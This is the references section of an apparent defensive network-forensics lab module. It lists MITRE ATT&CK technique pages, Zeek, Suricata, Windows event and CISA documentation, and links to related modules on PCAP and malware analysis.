- MITRE ATT&CK T1572 (Protocol Tunneling) — https://attack.mitre.org/techniques/T1572/
- MITRE ATT&CK T1003 (Credential Dumping) — https://attack.mitre.org/techniques/T1003/
- MITRE ATT&CK T1048 (Exfiltration Over Alternative Protocol) — https://attack.mitre.org/techniques/T1048/
- MITRE ATT&CK T1132.001 (Data Encoding: Standard Encoding) — https://attack.mitre.org/techniques/T1132/001/
- MITRE ATT&CK T1095 (Non-Application Layer Protocol) — https://attack.mitre.org/techniques/T1095/
- MITRE ATT&CK T1588 (Obtain Capabilities) — https://attack.mitre.org/techniques/T1588/
- MITRE ATT&CK T1595 (Active Scanning) — https://attack.mitre.org/techniques/T1595/
- Zeek `http.log` fields — https://docs.zeek.org/en/master/logs/http.html
- Zeek `conn.log` fields — https://docs.zeek.org/en/master/logs/conn.html
- Suricata HTTP keywords for rules — https://docs.suricata.io/en/latest/rules/http-keywords.html
- Security Onion (Zeek/Suricata/Elastic/PCAP analysis) — https://docs.securityonion.net/
- SANS FOR508 — DFIR investigative workflow and phases — https://www.sans.org/cyber-security-courses/advanced-incident-response-threat-hunting/
- Windows Event ID 4688 (Process Creation) — https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688
- Windows Event ID 5156 (WFP Connection) — https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-5156
- JA3 TLS fingerprinting — https://github.com/salesforce/ja3
- CISA detection guidance — https://www.cisa.gov/resources-tools/services/detecting-post-compromise-threat-activity-microsoft-cloud-environments
- FireEye network traffic analysis (archived) — https://web.archive.org/web/2021*/https://www.fireeye.com/current-threats.html (note: original page no longer active; archived version used for reference)
- RFC 5737 documentation addresses — https://datatracker.ietf.org/doc/html/rfc5737
- Center for Internet Security (CIS) — https://www.cisecurity.org (general guidance)
- US-CERT (now CISA) — https://www.cisa.gov (general guidance)

## Related modules
- [Network / PCAP analysis](../07-network-pcap/README.md) -- shares tshark for PCAP triage and filtering.
- [Wireshark / tshark deep packet analysis](../24-wireshark-deep/README.md) -- shares tshark for deeper packet dissection and stream following.
- [Scenario: ransomware memory investigation](../47-ransomware-memory-case/README.md) -- shares yara for pattern-matching carved artifacts.
- [Malware static triage](../08-malware-static-triage/README.md) -- shares yara for authoring and running detection rules.

<!-- cyberlab-enriched: v5 -->
- https://attack.mitre.org/techniques/T1110/003/
- https://attack.mitre.org/techniques/T1560/001/
- https://www.wireshark.org/docs/
- https://attack.mitre.org/techniques/T1002/
- https://attack.mitre.org/techniques/T1018/
- https://yara.readthedocs.io/en/v4.2.3/
- https://sigma-docs.github.io/
- https://attack.mitre.org/
- https://www.cisa.gov/

<!-- cyberlab-enriched: v6 -->
